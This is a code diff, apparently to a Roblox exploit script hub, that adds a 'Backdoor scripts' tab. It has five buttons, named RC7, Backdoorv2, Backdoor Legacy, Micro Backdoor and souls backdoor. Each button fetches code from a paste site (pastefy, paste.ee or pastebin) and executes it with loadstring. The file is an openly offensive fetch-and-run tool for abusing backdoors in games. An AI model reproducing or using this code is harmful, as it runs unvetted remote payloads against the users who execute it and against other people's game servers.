@@ -128,3 +128,65 @@ loadstring(game:HttpGet("https://pastefy.app/Z4qr8inE/raw",true))()
    end,
 })
 
+local Tab = Window:CreateTab("Backdoor scripts", 4483362458) -- Title, Image
+local Label = Tab:CreateLabel("Backdoor", 4483362458, Color3.fromRGB(255, 255, 255), false) -- Title, Icon, Color, IgnoreTheme
+
+local Button = Tab:CreateButton({
+   Name = "RC7",
+   Callback = function()
+loadstring(game:HttpGet("https://pastefy.app/HHJrRNTK/raw",true))()
+   -- The function that takes place when the button is pressed
+   end,
+})
+
+
+local Button = Tab:CreateButton({
+Name = "Backdoorv2",
+Callback = function()
+loadstring(game:HttpGet("https://pastefy.app/PCLasNAc/raw",true))()
+-- The function that takes place when the button is pressed
+end,
+})
+
+
+local Button = Tab:CreateButton({
+Name = "Backdoor Legacy",
+Callback = function()
+loadstring(game:HttpGet("https://pastefy.app/82Ty2DZX/raw",true))()
+-- The function that takes place when the button is pressed
+end,
+})
+
+local Button = Tab:CreateButton({
+Name = "Micro Backdoor",
+Callback = function()
+loadstring(game:HttpGet("https://paste.ee/r/1FC2N"))()
+-- The function that takes place when the button is pressed
+end,
+})
+
+
+local Button = Tab:CreateButton({
+Name = "souls backdoor",
+Callback = function()
+loadstring(game:HttpGet("https://pastebin.com/raw/rgERwgFj"))()
+-- The function that takes place when the button is pressed
+end,
+})
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
